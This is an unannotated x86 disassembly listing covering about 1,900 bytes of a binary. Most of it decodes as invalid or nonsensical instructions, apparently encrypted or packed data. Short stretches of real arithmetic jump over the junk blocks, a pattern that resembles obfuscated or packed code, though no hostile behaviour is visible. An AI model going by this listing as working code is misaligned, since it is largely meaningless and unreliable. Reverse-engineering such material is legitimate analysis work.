  40c880:	arpl   WORD PTR [esi+0x28],cx
  40c883:	retf   0x55c9
  40c886:	mov    eax,0x1854d9ee
  40c88b:	(bad)  
  40c88c:	neg    ebp
  40c88e:	push   edx
  40c88f:	add    BYTE PTR [esp+ecx*1],al
  40c892:	imul   esp,DWORD PTR [ebx-0x66],0xffffff89
  40c896:	mov    edi,0xa78ebc2a
  40c89b:	and    DWORD PTR [esi+0x4c0d29c6],0xf9e722a4
  40c8a5:	xor    eax,0x98465aa4
  40c8aa:	cmp    eax,0x231f7983
  40c8af:	(bad)  
  40c8b0:	jmp    0x891454f
  40c8b5:	or     eax,0x3eed63c4
  40c8ba:	(bad)  
  40c8bb:	stc    
  40c8bc:	in     eax,0x78
  40c8be:	in     al,dx
  40c8bf:	int3   
  40c8c0:	or     ebx,ebx
  40c8c2:	bound  ebx,QWORD PTR [esp+edx*2]
  40c8c5:	sbb    eax,0x4a7def1a
  40c8ca:	in     al,dx
  40c8cb:	sbb    BYTE PTR [edx],ch
  40c8cd:	imul   ebp,DWORD PTR [ebp+0x7a3cb03c],0xf39847ca
  40c8d7:	ret    0xe71a
  40c8da:	scas   eax,DWORD PTR es:[edi]
  40c8db:	and    cl,ah
  40c8dd:	add    ah,dl
  40c8df:	mov    dh,0x9f
  40c8e1:	xchg   BYTE PTR [esp+ebx*4+0x44],dh
  40c8e5:	icebp  
  40c8e6:	ss inc eax
  40c8e8:	adc    al,0x11
  40c8ea:	sti    
  40c8eb:	mov    gs,WORD PTR [edx+0x33e87d8b]
  40c8f1:	clc    
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	and    DWORD PTR [ecx],ebp
  40c91a:	(bad)  
  40c91b:	scas   eax,DWORD PTR es:[edi]
  40c91c:	in     al,dx
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c8fe
  40c925:	jle    0x40c98b
  40c927:	fist   WORD PTR [ebp-0x18]
  40c92a:	(bad)  
  40c92b:	adc    ebx,edi
  40c92d:	jmp    0x40c99b
  40c92f:	add    eax,DWORD PTR [edx+0x5a6ad350]
  40c935:	and    al,0xa0
  40c937:	nop
  40c938:	jns    0x40c95a
  40c93a:	pop    ecx
  40c93b:	cli    
  40c93c:	repz js 0x40c92f
  40c93f:	lock fnsave [edx-0x5295cb61]
  40c946:	push   ebx
  40c947:	or     eax,0x9d48650d
  40c94c:	push   ebp
  40c94d:	inc    eax
  40c94e:	sbb    al,0xdd
  40c950:	add    BYTE PTR [ecx],ch
  40c952:	stos   BYTE PTR es:[edi],al
  40c953:	push   esi
  40c954:	mov    eax,ds:0xd6d02f06
  40c959:	fidiv  DWORD PTR [edx+edi*2-0x6c318847]
  40c960:	in     al,dx
  40c961:	mov    esi,0xeadca45c
  40c966:	(bad)  [edi]
  40c968:	call   ecx
  40c96a:	inc    eax
  40c96b:	and    BYTE PTR [ebx-0x1a8635ca],dh
  40c971:	jo     0x40c904
  40c973:	jns    0x40c936
  40c975:	add    edi,DWORD PTR [edx+ebp*8+0x6e]
  40c979:	jg     0x40c9dc
  40c97b:	mulps  xmm3,XMMWORD PTR [esi]
  40c97e:	sub    DWORD PTR gs:[edi+0x7c],ebp
  40c982:	adc    DWORD PTR [ecx+0x71],edi
  40c985:	xchg   ebp,eax
  40c986:	pusha  
  40c987:	mov    ch,0xaf
  40c989:	test   BYTE PTR [edx-0x17],bh
  40c98c:	aad    0x36
  40c98e:	jnp    0x40c9e2
  40c990:	popf   
  40c991:	loopne 0x40c94c
  40c993:	fist   WORD PTR [ebp-0x14ce160e]
  40c999:	out    0x74,eax
  40c99b:	rol    esi,cl
  40c99d:	(bad)  
  40c99e:	rep ins BYTE PTR es:[edi],dx
  40c9a0:	push   cs
  40c9a1:	(bad)  
  40c9a2:	or     eax,0x97f75002
  40c9a7:	sub    BYTE PTR [esi],dl
  40c9a9:	jnp    0x40c984
  40c9ab:	fdiv   QWORD PTR [ebx]
  40c9ad:	cmp    BYTE PTR [ebx+0x33],dl
  40c9b0:	push   0x72
  40c9b2:	lds    edi,FWORD PTR [ebx-0x10]
  40c9b5:	xor    bh,BYTE PTR [ebx+ecx*8+0x7d594de3]
  40c9bc:	jp     0x40ca26
  40c9be:	and    eax,0xc740204c
  40c9c3:	jle    0x40c965
  40c9c5:	lods   eax,DWORD PTR ds:[esi]
  40c9c6:	mov    ds:0x7bc1bae1,al
  40c9cb:	or     bh,dh
  40c9cd:	cmp    DWORD PTR [ebx-0x73],ebx
  40c9d0:	and    eax,0x2fd6d494
  40c9d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9d6:	mov    eax,0xcb493b94
  40c9db:	mov    eax,0x561d7d56
  40c9e0:	imul   esi,edi,0xffffff8a
  40c9e3:	pop    ebp
  40c9e4:	cdq    
  40c9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9e6:	in     al,0x96
  40c9e8:	mov    edx,0xe914a299
  40c9ed:	mov    WORD PTR ds:[bx+di+0x31],fs
  40c9f2:	imul   eax,DWORD PTR [eax],0xabcff051
  40c9f8:	and    BYTE PTR [eax],al
  40c9fa:	out    0x38,al
  40c9fc:	or     bh,BYTE PTR [edi-0x46e70d57]
  40ca02:	in     al,dx
  40ca03:	aam    0xe5
  40ca05:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40ca07:	inc    ebp
  40ca08:	pop    edi
  40ca09:	xchg   edi,eax
  40ca0a:	(bad)  
  40ca0b:	(bad)  
  40ca0c:	jg     0x40ca5c
  40ca0e:	int    0xe8
  40ca10:	clc    
  40ca11:	enter  0xf56e,0x47
  40ca15:	maskmovq mm1,(bad)
  40ca16:	test   DWORD PTR [eax],0x6588a401
  40ca1c:	jno    0x40ca5e
  40ca1e:	push   cs
  40ca1f:	adc    edx,0xb
  40ca22:	jge    0x40ca39
  40ca24:	inc    ebp
  40ca25:	adc    ebp,DWORD PTR [eax-0x5b]
  40ca28:	inc    ebx
  40ca29:	and    DWORD PTR ds:0xc0f9dcf3,esi
  40ca2f:	xchg   BYTE PTR [edx],ch
  40ca31:	rcl    DWORD PTR [edx+0x10],cl
  40ca34:	out    0xbc,al
  40ca36:	pop    ecx
  40ca37:	mov    ch,0x17
  40ca39:	push   es
  40ca3a:	cmp    eax,0x87bcc7bc
  40ca3f:	jp     0x40ca9e
  40ca41:	sahf   
  40ca42:	xchg   BYTE PTR [esp+ebp*1-0x4c8e514a],cl
  40ca49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca4a:	pop    eax
  40ca4b:	inc    ebp
  40ca4c:	add    DWORD PTR [edi+0x497dd1d8],ebx
  40ca52:	lods   al,BYTE PTR ds:[esi]
  40ca53:	test   BYTE PTR [edi],al
  40ca55:	lgs    ebx,FWORD PTR [ebx+0x2a2c449e]
  40ca5c:	pushf  
  40ca5d:	mov    esp,0xcb9c15b8
  40ca62:	pop    ds
  40ca63:	push   edi
  40ca64:	rol    BYTE PTR [ebx+0x1d77ad8c],0xc3
  40ca6b:	jecxz  0x40cab4
  40ca6d:	mov    al,0xce
  40ca6f:	sbb    eax,0x38602413
  40ca74:	mov    ds:0x65ea996,eax
  40ca79:	jb     0x40caca
  40ca7b:	daa    
  40ca7c:	std    
  40ca7d:	std    
  40ca7e:	jle    0x40caad
  40ca80:	out    0xf0,eax
  40ca82:	call   0x2084:0x6e3f1adf
  40ca89:	mov    bh,0xa1
  40ca8b:	sub    esi,DWORD PTR [edi+0x4d373e84]
  40ca91:	cwde   
  40ca92:	push   0x8b188c7d
  40ca97:	push   ebp
  40ca98:	nop
  40ca99:	loope  0x40cb06
  40ca9b:	stc    
  40ca9c:	and    BYTE PTR [esi],cl
  40ca9e:	inc    edi
  40ca9f:	mov    ah,0x3c
  40caa1:	pop    edi
  40caa2:	fistp  QWORD PTR [esi-0x1c8bcfdf]
  40caa8:	cmp    ebp,DWORD PTR [esp+edi*2-0x1bf77f4f]
  40caaf:	cli    
  40cab0:	push   ebp
  40cab1:	js     0x40ca91
  40cab3:	push   esp
  40cab4:	pop    esp
  40cab5:	xchg   DWORD PTR [eax-0x61],esp
  40cab8:	lods   eax,DWORD PTR ds:[esi]
  40cab9:	mov    al,0x90
  40cabb:	aam    0xdc
  40cabd:	jle    0x40ca81
  40cabf:	jo     0x40cb1f
  40cac1:	ficom  WORD PTR [ebp-0x3e]
  40cac4:	das    
  40cac5:	stos   DWORD PTR es:[edi],eax
  40cac6:	xchg   ebx,eax
  40cac7:	xchg   edi,eax
  40cac8:	xchg   BYTE PTR [ecx-0x5f86c5f9],bh
  40cace:	mov    cl,0xa4
  40cad0:	mov    cl,BYTE PTR [ebp+0x77]
  40cad3:	push   esi
  40cad4:	mov    fs,WORD PTR [ebx]
  40cad6:	lea    ecx,[eax+0x74]
  40cad9:	and    edx,edx
  40cadb:	push   es
  40cadc:	cmp    ebx,edx
  40cade:	add    edx,DWORD PTR ds:0x816383c6
  40cae4:	ins    DWORD PTR es:[edi],dx
  40cae5:	outs   dx,BYTE PTR ds:[esi]
  40cae6:	retf   
  40cae7:	mov    ah,0x50
  40cae9:	sbb    BYTE PTR [ebx],al
  40caeb:	and    ah,dl
  40caed:	mov    ah,BYTE PTR [edx-0x7171757]
  40caf3:	pop    ss
  40caf4:	out    dx,eax
  40caf5:	or     dl,BYTE PTR [eax-0x12748ee1]
  40cafb:	pop    ebp
  40cafc:	push   0xffffff9d
  40cafe:	or     eax,0xc00e40d9
  40cb03:	pop    eax
  40cb04:	(bad)  
  40cb05:	adc    BYTE PTR [ecx+0x25],al
  40cb08:	repnz add al,0xab
  40cb0b:	adc    dh,0x81
  40cb0e:	cs inc esp
  40cb10:	hlt    
  40cb11:	frstor [ebx]
  40cb13:	and    eax,0xc99ed2d1
  40cb18:	scas   eax,DWORD PTR es:[edi]
  40cb19:	cmp    al,0xea
  40cb1b:	cmp    DWORD PTR [eax+0x7c0dcf7f],eax
  40cb21:	push   edi
  40cb22:	scas   al,BYTE PTR es:[edi]
  40cb23:	mov    ?,WORD PTR [esp+ebx*2+0x2f5b13ae]
  40cb2a:	sbb    DWORD PTR [eax+edx*2],ebp
  40cb2d:	push   eax
  40cb2e:	sub    DWORD PTR [edi+0x3ffa8e5f],0xf
  40cb35:	div    dh
  40cb37:	mov    DWORD PTR [ebx+0x6c],esp
  40cb3a:	adc    DWORD PTR [edx+0x7e],eax
  40cb3d:	cli    
  40cb3e:	sub    eax,0xc5beafcf
  40cb43:	sub    eax,0xe824e155
  40cb48:	je     0x40cb6e
  40cb4a:	mov    esi,0x1e607d6d
  40cb4f:	in     eax,0x28
  40cb51:	rol    BYTE PTR [ebx+0x5d],0xf7
  40cb55:	bound  ebp,QWORD PTR [ecx-0x6d]
  40cb58:	aas    
  40cb59:	loop   0x40cb85
  40cb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb5c:	pop    eax
  40cb5d:	popa   
  40cb5e:	jnp    0x40caeb
  40cb60:	outs   dx,BYTE PTR ds:[esi]
  40cb62:	add    al,0x8f
  40cb64:	inc    ebx
  40cb65:	pushf  
  40cb66:	test   al,0xb4
  40cb68:	cs inc ebx
  40cb6a:	or     eax,0x720e97b2
  40cb6f:	inc    esi
  40cb70:	pusha  
  40cb71:	cli    
  40cb72:	lods   eax,DWORD PTR ds:[esi]
  40cb73:	push   ebp
  40cb74:	inc    esi
  40cb75:	loopne 0x40cb9b
  40cb77:	daa    
  40cb78:	jns    0x40cb24
  40cb7a:	push   ebx
  40cb7b:	and    dl,ch
  40cb7d:	lock mov cl,0xe3
  40cb80:	add    eax,0x771678a3
  40cb85:	rcr    BYTE PTR [ebx-0x6a4bd152],0x28
  40cb8c:	and    DWORD PTR [edi],0xa1f83b8a
  40cb92:	mov    eax,ds:0xb108ae9b
  40cb97:	loope  0x40cbd7
  40cb99:	in     al,dx
  40cb9a:	mov    esp,0x59364286
  40cb9f:	sbb    ah,BYTE PTR [esi-0x6b]
  40cba2:	(bad)  
  40cba3:	iret   
  40cba4:	sbb    DWORD PTR [ecx-0xa4b1662],ecx
  40cbaa:	scas   al,BYTE PTR es:[edi]
  40cbab:	fidiv  WORD PTR [ebx-0x1d]
  40cbae:	int3   
  40cbaf:	pusha  
  40cbb0:	xor    eax,0xfe953f52
  40cbb5:	int3   
  40cbb6:	mov    ds:0xfd7cb5d8,eax
  40cbbb:	fisttp WORD PTR [esi]
  40cbbd:	mov    ch,BYTE PTR [edi-0x8]
  40cbc0:	add    al,0xe9
  40cbc2:	jg     0x40cc27
  40cbc4:	fiadd  WORD PTR [edi-0x56]
  40cbc7:	adc    DWORD PTR [edi],ecx
  40cbc9:	lods   al,BYTE PTR es:[esi]
  40cbcb:	or     esp,DWORD PTR [ecx]
  40cbcd:	into   
  40cbce:	pop    ebx
  40cbcf:	push   esi
  40cbd0:	test   eax,0x4c711596
  40cbd5:	xchg   BYTE PTR [edx+esi*1-0x58],dl
  40cbd9:	xor    DWORD PTR [edx-0x4f2eaa29],esp
  40cbdf:	xchg   ebx,eax
  40cbe0:	in     eax,dx
  40cbe1:	sub    eax,DWORD PTR [eax-0x69]
  40cbe4:	lahf   
  40cbe5:	imul   esi,DWORD PTR [ebp-0x2b0978ef],0xcbd0b0e7
  40cbef:	out    0x71,al
  40cbf1:	call   0x8af077cc
  40cbf6:	repnz ffree st(6)
  40cbf9:	mov    eax,0x70e2fe40
  40cbfe:	lods   eax,DWORD PTR ds:[esi]
  40cbff:	mov    ecx,0x62a957a4
  40cc04:	pop    es
  40cc05:	xchg   edi,eax
  40cc06:	clc    
  40cc07:	fldcw  WORD PTR [ebx]
  40cc09:	sbb    BYTE PTR [esi+0x6ed6adde],bl
  40cc0f:	jge    0x40cc4c
  40cc11:	fidiv  DWORD PTR [ebx+0x6b]
  40cc14:	push   ecx
  40cc15:	adc    bl,BYTE PTR ds:0xbb5fc4cc
  40cc1b:	fs nop
  40cc1d:	cs cmp cl,dl
  40cc20:	mov    edi,0xf158e1bc
  40cc25:	xor    bl,BYTE PTR [ebx]
  40cc27:	jle    0x40cbbe
  40cc29:	outs   dx,DWORD PTR ds:[esi]
  40cc2a:	sub    DWORD PTR [esi],ebp
  40cc2c:	pop    esp
  40cc2d:	push   esp
  40cc2e:	adc    al,0x7
  40cc30:	repnz test ebp,0x7b8b2d5d
  40cc37:	xlat   BYTE PTR ds:[ebx]
  40cc38:	popa   
  40cc39:	ror    BYTE PTR [edi],cl
  40cc3b:	sbb    DWORD PTR [ebp+0x52],edi
  40cc3e:	cs xchg ebp,eax
  40cc40:	ret    0x69b5
  40cc43:	jae    0x40cc1d
  40cc45:	loope  0x40ccc6
  40cc47:	jns    0x40cc3a
  40cc49:	push   ss
  40cc4a:	retf   
  40cc4b:	stc    
  40cc4c:	imul   DWORD PTR [esi+0x30f99f6d]
  40cc52:	jnp    0x40cc1e
  40cc54:	scas   al,BYTE PTR es:[edi]
  40cc55:	jbe    0x40ccb6
  40cc57:	shl    BYTE PTR [ebx+0x33],1
  40cc5a:	stc    
  40cc5b:	das    
  40cc5c:	jae    0x40ccad
  40cc5e:	add    ebp,esi
  40cc60:	hlt    
  40cc61:	push   ecx
  40cc62:	fsubr  DWORD PTR [edx+0x56]
  40cc65:	add    ebx,DWORD PTR [eax-0x5e92564b]
  40cc6b:	and    esi,DWORD PTR [edi]
  40cc6d:	sub    ebp,edx
  40cc6f:	mov    al,ds:0x432644a
  40cc74:	call   0xdaf23f9c
  40cc79:	sub    ebp,DWORD PTR [eax+eiz*8]
  40cc7c:	jmp    0x534b0c47
  40cc81:	or     al,0xc
  40cc83:	imul   esi,DWORD PTR [ecx-0x3e471b04],0x26
  40cc8a:	jmp    0xe420:0x5dd69b6
  40cc91:	and    bh,cl
  40cc93:	into   
  40cc94:	aam    0xfe
  40cc96:	fstp   DWORD PTR [esi-0x19]
  40cc99:	mov    edi,0xac85d77e
  40cc9e:	mov    eax,0xd7e6feb
  40cca3:	scas   al,BYTE PTR es:[edi]
  40cca4:	push   ecx
  40cca5:	or     bh,cl
  40cca7:	js     0x40cc3d
  40cca9:	mov    eax,ds:0x2facf88f
  40ccae:	clc    
  40ccaf:	lahf   
  40ccb0:	(bad)  
  40ccb2:	adc    al,0xb5
  40ccb4:	iret   
  40ccb5:	pop    edx
  40ccb6:	retf   0xfcd
  40ccb9:	pop    edx
  40ccba:	pop    esp
  40ccbb:	fist   DWORD PTR [edx+0x11]
  40ccbe:	stos   DWORD PTR es:[edi],eax
  40ccbf:	stc    
  40ccc0:	fdiv   DWORD PTR ds:0x33a3c77b
  40ccc6:	clc    
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	or     eax,0x68
  40cd18:	xor    edx,ebx
  40cd1a:	or     edx,DWORD PTR [eax+0x7d9f7070]
  40cd20:	jo     0x40cd92
  40cd22:	int    0xf4
  40cd24:	xor    eax,0x7bb5f8cc
  40cd29:	aas    
  40cd2a:	dec    ecx
  40cd2b:	sub    BYTE PTR [ecx-0x325ecac7],0x85
  40cd32:	fnsave [eax-0x1a]
  40cd35:	lock cld 
  40cd37:	xor    DWORD PTR [edx+0x40],eax
  40cd3a:	pop    ebx
  40cd3b:	lds    esp,FWORD PTR [ebx-0x3c]
  40cd3e:	arpl   WORD PTR [ecx-0x69],bp
  40cd41:	dec    edi
  40cd42:	and    eax,0xcf234989
  40cd47:	xchg   ecx,eax
  40cd48:	or     esi,DWORD PTR [bp-0x7092]
  40cd4d:	fnstsw WORD PTR [edi]
  40cd4f:	icebp  
  40cd50:	loopne 0x40cd3f
  40cd52:	out    dx,eax
  40cd53:	aam    0x63
  40cd55:	jno    0x63050700
  40cd5b:	mov    cl,0xfe
  40cd5d:	xchg   eax,edi
  40cd5f:	ins    BYTE PTR es:[edi],dx
  40cd60:	cmp    al,0xd7
  40cd62:	jo     0x40cdce
  40cd64:	push   eax
  40cd65:	mov    bl,0xf1
  40cd67:	xchg   edx,eax
  40cd68:	or     DWORD PTR [eax-0x7a],eax
  40cd6b:	stc    
  40cd6c:	adc    al,0x3
  40cd6e:	jae    0x40cd85
  40cd70:	lods   eax,DWORD PTR ds:[esi]
  40cd71:	cli    
  40cd72:	pop    ebp
  40cd73:	jge    0x40cd6c
  40cd75:	pop    ebx
  40cd76:	dec    esi
  40cd77:	mov    eax,esp
  40cd79:	cwde   
  40cd7a:	mov    ecx,0x6821a782
  40cd7f:	ss dec edx
  40cd81:	push   ecx
  40cd82:	mov    edx,0x3112fb0a
  40cd87:	daa    
  40cd88:	aas    
  40cd89:	jge    0x40cda6
  40cd8b:	cli    
  40cd8c:	pop    ebx
  40cd8d:	jecxz  0x40cd9e
  40cd8f:	jmp    0x40cd46
  40cd91:	leave  
  40cd92:	mov    bh,0x6c
  40cd94:	test   DWORD PTR [ecx-0x19],ebx
  40cd97:	add    al,BYTE PTR [ebp-0x41]
  40cd9a:	sub    al,0x4d
  40cd9c:	mov    esi,0xfb7babad
  40cda1:	ja     0x40ce1c
  40cda3:	bound  ecx,QWORD PTR [eax]
  40cda5:	jne    0x40cd2d
  40cda7:	cs call 0xca5c:0x5cea6224
  40cdaf:	mov    BYTE PTR [eax+0xad29e5b],bh
  40cdb5:	pop    ss
  40cdb6:	or     DWORD PTR [ebx-0x5b],ecx
  40cdb9:	shrd   ebx,ebp,0x9b
  40cdbd:	fwait
  40cdbe:	xchg   esi,eax
  40cdbf:	loop   0x40cd5f
  40cdc1:	or     DWORD PTR [edx+0x6797eb60],0x783cee00
  40cdcb:	xchg   ecx,eax
  40cdcc:	cmp    ebp,0xab2809ea
  40cdd2:	les    esi,FWORD PTR [edx+eax*8+0x651ddc86]
  40cdd9:	jne    0x40ce41
  40cddb:	inc    ecx
  40cddc:	inc    ebx
  40cddd:	xor    al,BYTE PTR [eax-0x15]
  40cde0:	test   DWORD PTR gs:[edx-0x40],ecx
  40cde4:	popf   
  40cde5:	sar    BYTE PTR [esi-0x4e],1
  40cde8:	lock ret 
  40cdea:	mov    esi,0x8ae8c86d
  40cdef:	imul   ebx,DWORD PTR [edx+0x70],0x77
  40cdf3:	adc    DWORD PTR [edx-0x66],0xffffffa1
  40cdf7:	mov    BYTE PTR [ecx],dh
  40cdf9:	push   ebx
  40cdfa:	pop    eax
  40cdfb:	add    edx,DWORD PTR [ebx+eiz*4+0x5d2e2bae]
  40ce02:	mov    DWORD PTR [ecx+0x3f1b04af],0xdfda7549
  40ce0c:	sti    
  40ce0d:	shr    BYTE PTR [ebp+eax*8+0x71],0xc9
  40ce12:	sbb    eax,0x72d7a5dd
  40ce17:	(bad)  
  40ce18:	int    0xe6
  40ce1a:	lods   eax,DWORD PTR ds:[esi]
  40ce1b:	jb     0x40cdb6
  40ce1d:	es sti 
  40ce1f:	jge    0x40ce05
  40ce21:	push   eax
  40ce22:	mov    bl,0x15
  40ce24:	enter  0xd07e,0xce
  40ce28:	out    0xc4,al
  40ce2a:	icebp  
  40ce2b:	pop    edx
  40ce2c:	add    eax,0x9ba47cd9
  40ce31:	iret   
  40ce32:	fsubr  DWORD PTR [ecx]
  40ce34:	mov    edx,0xe11ceeed
  40ce39:	sub    dh,bl
  40ce3b:	push   ds
  40ce3c:	lahf   
  40ce3d:	jae    0x40ce2b
  40ce3f:	(bad)  
  40ce40:	dec    eax
  40ce41:	cmp    al,0x9b
  40ce43:	stc    
  40ce44:	nop
  40ce45:	jmp    0x40cdd4
  40ce47:	outs   dx,BYTE PTR ds:[esi]
  40ce48:	jl     0x40ce5b
  40ce4a:	push   edx
  40ce4b:	xor    al,0xc9
  40ce4d:	stos   DWORD PTR es:[edi],eax
  40ce4e:	aam    0x66
  40ce50:	xchg   DWORD PTR [ebp+0x58],esp
  40ce53:	or     dh,al
  40ce55:	imul   eax,ebp,0x888a1692
  40ce5b:	icebp  
  40ce5c:	mov    DWORD PTR [ebp+edx*8+0x1a],edx
  40ce60:	rol    BYTE PTR [edi-0x57],cl
  40ce63:	je     0x40ce0c
  40ce65:	cli    
  40ce66:	cdq    
  40ce67:	xor    eax,0x22f18824
  40ce6c:	sbb    ecx,eax
  40ce6e:	or     ebx,DWORD PTR [eax]
  40ce70:	inc    esp
  40ce71:	sbb    ch,BYTE PTR [edi]
  40ce73:	add    BYTE PTR [eax-0x6660b898],dh
  40ce79:	lahf   
  40ce7a:	or     DWORD PTR [esi+edi*2-0x41276ace],edx
  40ce81:	sbb    DWORD PTR [ecx],ecx
  40ce83:	inc    edx
  40ce84:	push   cs
  40ce85:	dec    edi
  40ce86:	stos   BYTE PTR es:[edi],al
  40ce87:	jg     0x40ceb0
  40ce89:	push   cs
  40ce8a:	pop    es
  40ce8b:	mov    eax,ds:0x6671dace
  40ce90:	call   0x4441f44
  40ce95:	js     0x40ce90
  40ce97:	xchg   esp,eax
  40ce98:	ret    0xbe3a
  40ce9b:	cmp    eax,0x65225756
  40cea0:	sbb    edx,DWORD PTR [ebx]
  40cea2:	test   BYTE PTR [edi-0x7c],bl
  40cea5:	ret    0xb268
  40cea8:	mov    edi,0x526569ff
  40cead:	mov    ds:0x8a7efbfe,al
  40ceb2:	cmp    DWORD PTR [esi-0x589a00c0],ecx
  40ceb8:	(bad)  
  40ceb9:	je     0x40ce93
  40cebb:	jo     0x40ce6e
  40cebd:	out    dx,eax
  40cebe:	popf   
  40cebf:	repnz mov ebx,DWORD PTR [ebx+0x63eafed8]
  40cec6:	test   al,0x67
  40cec8:	stos   BYTE PTR es:[edi],al
  40cec9:	sbb    eax,0x34d5f47f
  40cece:	ret    
  40cecf:	(bad)  
  40ced0:	std    
  40ced1:	mov    al,0x14
  40ced3:	(bad)  
  40ced4:	mov    eax,0x5ea3bccb
  40ced9:	mov    WORD PTR [ebp-0x2c],ss
  40cedc:	nop
  40cedd:	fist   DWORD PTR [edx]
  40cedf:	popf   
  40cee0:	stos   BYTE PTR es:[edi],al
  40cee1:	call   0x8c5383cf
  40cee6:	pop    es
  40cee7:	xlat   BYTE PTR ds:[ebx]
  40cee8:	sbb    DWORD PTR [ecx+0x7a23f861],0x5ca88a14
  40cef2:	fwait
  40cef3:	and    BYTE PTR [eax-0x5b],al
  40cef6:	loopne 0x40cf21
  40cef8:	loopne 0x40cee7
  40cefa:	out    dx,eax
  40cefb:	cmp    eax,0x530da9b6
  40cf00:	(bad)  
  40cf01:	lds    edx,FWORD PTR [esi-0x44]
  40cf04:	repz dec DWORD PTR [ecx+0x36fb3d9e]
  40cf0b:	mov    ebx,0x81f1adc6
  40cf10:	mov    DWORD PTR [ecx+edi*8-0x35],0xeef33e47
  40cf18:	pop    ebp
  40cf19:	int3   
  40cf1a:	in     al,dx
  40cf1b:	fs dec ecx
  40cf1d:	pop    esp
  40cf1e:	push   0x87eecbcc
  40cf23:	jp     0x40cf85
  40cf25:	jmp    0xfe87998d
  40cf2a:	xchg   ebx,eax
  40cf2b:	fnstenv [edx-0x17]
  40cf2e:	leave  
  40cf2f:	bound  edi,QWORD PTR ds:0xba41f3f2
  40cf35:	bound  edx,QWORD PTR [ebx+edx*1]
  40cf38:	imul   ecx,ecx,0x3a364585
  40cf3e:	outs   dx,DWORD PTR ds:[esi]
  40cf3f:	dec    ebp
  40cf40:	imul   edx,DWORD PTR [edx+0x32599f7],0xffffff8e
  40cf47:	adc    DWORD PTR [ebx-0x6151671e],esi
  40cf4d:	fsub   QWORD PTR [ebp-0x3b]
  40cf50:	repnz xor ch,BYTE PTR [eax-0xe]
  40cf54:	(bad)  
  40cf55:	jl     0x40cfd3
  40cf57:	outs   dx,BYTE PTR ds:[esi]
  40cf58:	imul   edx,ecx,0x3f
  40cf5b:	pusha  
  40cf5c:	jbe    0x40cf3f
  40cf5e:	int3   
  40cf5f:	out    dx,al
  40cf60:	(bad)  
  40cf62:	aaa    
  40cf63:	bnd jg 0x40cf24
  40cf66:	cdq    
  40cf67:	ret    0x371c
  40cf6a:	retf   
  40cf6b:	mov    bh,BYTE PTR [edx+0x24]
  40cf6e:	lods   eax,DWORD PTR ds:[esi]
  40cf6f:	sub    DWORD PTR [ecx+0x4cb4696e],ebp
  40cf75:	in     al,0x97
  40cf77:	push   esp
  40cf78:	mov    WORD PTR [edx-0x21],gs
  40cf7b:	mov    ds:0xf7a5c6bc,al
  40cf80:	sub    al,0xd3
  40cf82:	or     DWORD PTR [esi+esi*8-0x32],esp
  40cf86:	pop    edi
  40cf87:	mov    dl,0x9d
  40cf89:	adc    DWORD PTR ds:0x5678d13,0x1d
  40cf90:	mov    bh,0x7a
  40cf92:	cwde   
  40cf93:	and    DWORD PTR [ecx-0x7],esp
  40cf96:	mov    ebx,0x7ff6a7fe
  40cf9c:	adc    DWORD PTR [edx],ecx
  40cf9e:	(bad)  
  40cf9f:	sbb    DWORD PTR [edi],ecx
  40cfa1:	push   es
  40cfa2:	ins    BYTE PTR es:[edi],dx
  40cfa3:	xchg   DWORD PTR [ebx+0x1b],esp
  40cfa6:	add    al,dl
  40cfa8:	int3   
  40cfa9:	jmp    0x99ac:0xacb196a1
  40cfb0:	gs cmp eax,0x5cbd0264
  40cfb6:	jl     0x40cfc9
  40cfb8:	jl     0x40d012
  40cfba:	jg     0x40d00a
  40cfbc:	mov    eax,DWORD PTR [eax+0x5bf568e7]
  40cfc2:	cmp    dl,BYTE PTR [edi+ebp*8]
  40cfc5:	and    dh,BYTE PTR [esi+esi*4]
  40cfc8:	pop    edx
  40cfc9:	mov    ss,WORD PTR [edx-0x80]
  40cfcc:	fcmovne st,st(3)
  40cfce:	popf   
  40cfcf:	mov    ebx,ds
  40cfd1:	dec    edx
  40cfd2:	(bad)  [edx+ebx*2-0x7d5bccd9]
  40cfd9:	in     eax,0xfb
  40cfdb:	jne    0x40d00a
  40cfdd:	sbb    BYTE PTR [ebp+0x37e6406f],0x67
  40cfe4:	pop    esi
  40cfe5:	jp     0x40d005
  40cfe7:	and    al,0x56
  40cfe9:	adc    dh,dh
  40cfeb:	xchg   ebp,esi
  40cfed:	aas    
  40cfee:	pop    ds
